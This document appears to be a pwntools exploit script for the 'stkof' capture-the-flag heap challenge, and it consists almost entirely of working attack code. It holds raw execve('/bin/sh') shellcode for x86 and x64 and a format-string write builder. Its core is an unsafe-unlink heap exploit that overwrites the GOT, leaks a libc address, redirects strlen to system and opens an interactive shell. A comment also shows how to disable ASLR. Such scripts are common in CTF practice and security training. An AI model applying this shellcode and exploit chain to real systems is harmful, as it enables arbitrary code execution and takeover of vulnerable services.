from pwn import *
from random import choice
import sys, os

#readelf -s libc.so.6 | grep system
#echo 0 > /proc/sys/kernel/randomize_va_space

x86_x64_binsh = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
x86_binsh = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

def get_ip():
	p = util.net.getifaddrs()
	for c in p:
		if c.has_key('addr'):
			t = c['addr']
			if t != {}:
				if t['addr'] != '127.0.0.1':
					return t['addr']
	else:
		return 0

def pad(l, d='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', value=''):
	s = ''
	for i in range(0, l-len(value)):
		s += choice(d)
	return s + value

def fmt_string(offset_to_input, addrs_values_list, value=0):
	hw_list = []
	for c in addrs_values_list:
		t1 = c[1] & 0x0000ffff
		t2 = (c[1] & 0xffff0000) >> 16
		hw_list.append((c[0], t1))
		hw_list.append((c[0] + 2, t2))

	sorted_list = sorted(hw_list, key = lambda x: x[1])

	r = ''
	value = 0
	for c in sorted_list:
		r += p64(c[0])
		value += 4

	for c in sorted_list:
		if c[1] - value >= 8:
			r += '%{}x'.format(c[1]-value, 'd') + '%{}$hn'.format(offset_to_input+sorted_list.index(c))
		else:
			r += 'a'*(c[1]-value) + '%{}$hn'.format(offset_to_input+sorted_list.index(c))
		value = c[1]

	return r

def shl(num, n, max):
	return (num << n) & (2**max-1)

def shr(num, n ,max):
	return (num >> n) & (2**max-1)

rol = lambda val, r_bits, max_bits: \
 	(val << r_bits%max_bits) & (2**max_bits-1) | ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))


file_name = './stkof'
binary = ELF(file_name)
HOST = "127.0.0.1"#'pwn.chal.csaw.io'
PORT = 127
#HOST = "pwn.chal.csaw.io"
#PORT = 8002
LOCAL = 1
IP = get_ip()

if len(sys.argv) > 1:
	LOCAL = 0
	p = remote(HOST, PORT)
	pid = None
else:
	p = process([binary.path])
	pid = p.proc.pid

def pause():
	if not LOCAL:
		raw_input('[paused]')
	else:
		log.info('[PID]: %s' % pid)
		util.proc.wait_for_debugger(pid)

def ag(): #attach gdb
	gdb.attach(pid)
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
	
def exploit():
	pause();
	#Malloc 3 chunk
	p.send("1\n")
	p.send(str(0x70)+"\n")
	p.send("1\n")
	p.send(str(0x70)+"\n")
	p.send("1\n")
	p.send(str(0x70)+"\n")
	#Write chunk1 and overwrite chunk2
	p.send("2\n")
	p.send("1\n")
	p.send(str(0x180) + "\n")
	base = 0x0602140
	FD = base + 8 - 0x18
	BK = base + 8 - 0x10
	payload = ""
	#			PREV_SIZE	SIZE   P	FD			BK			Padding
	payload +=	p64(0x00) + p64(0x11) + p64(FD) + p64(BK) 	+ "\x00"*0x50 # fake chunk
	payload +=  p64(0x70) + p64(0x90) 						+ "\x00"*(0x80) # <-- free
	payload +=  p64(0x20) + p64(0x21) 						+ "\x00"*0x10
	payload +=  p64(0x20) + p64(0x21) 
	
	payload += "\x00" * ((0x180) -len(payload))
	p.send(payload + "\n")
	#free chunk2
	p.send("3\n")
	p.send("2\n")
	#edit chunk1, now it point to pointer array, and print printf address
	p.send("2\n")
	p.send("1\n")
	printfAddr = 0x602040 
	rewriteGot = p64(0)*3 + p64(0x0602148) + p64(0x0602030) + p64(0x602040)
	p.send(str(len(rewriteGot)) + "\n")
	p.send(rewriteGot + "\n")
	#overwrite strlen pointer to puts pointer
	putsAddr = 0x0400760
	p.send("2\n")
	p.send("2\n")
	p.send("8\n")
	p.send(p64(putsAddr))
	#leak printf address
	p.recv(1024)
	p.send("4\n")
	p.send("3\n")	
	leak = (u64(p.recv(6) + "\x00"*2))
	system = leak - 0xddb0
	binsh = leak + 0x128583
	#overwrite strlen pointer to system pointer
	p.send("2\n")
	p.send("1\n")
	rewriteGot = p64(0x0602148) + p64(0x0602030) + p64(binsh)
	p.send(str(len(rewriteGot)) + "\n")
	p.send(rewriteGot + "\n")
	
	p.send("2\n")
	p.send("2\n")
	p.send("8\n")
	p.send(p64(system))
	#call system(/bin/sh)
	p.send("4\n")
	p.send("3\n")
	
	
	
	p.interactive()

if __name__ == '__main__':
	exploit()
